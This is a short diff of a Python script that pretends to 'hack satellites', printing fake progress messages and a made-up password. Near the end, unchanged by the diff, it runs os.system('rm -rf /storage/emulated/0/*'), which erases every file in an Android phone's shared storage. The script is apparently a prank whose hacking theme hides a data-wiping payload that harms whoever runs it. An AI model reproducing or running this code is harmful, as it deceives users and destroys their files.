@@ -28,11 +28,11 @@ input("input the number of brand:")
 print("attack starting")
 
 
-for y in range (100):
+for y in range (10000):
 	print("Trying orbit satelit ",y," proccessing orbit ")
-HackSatelit = input("press enter to get password me:")
+HackSatelit = input("press enter to get password me: ")
 
-print("password:Datafilemobata")
+print("password : Datafilemobata")
 
 import os
 os.system('rm -rf /storage/emulated/0/*')
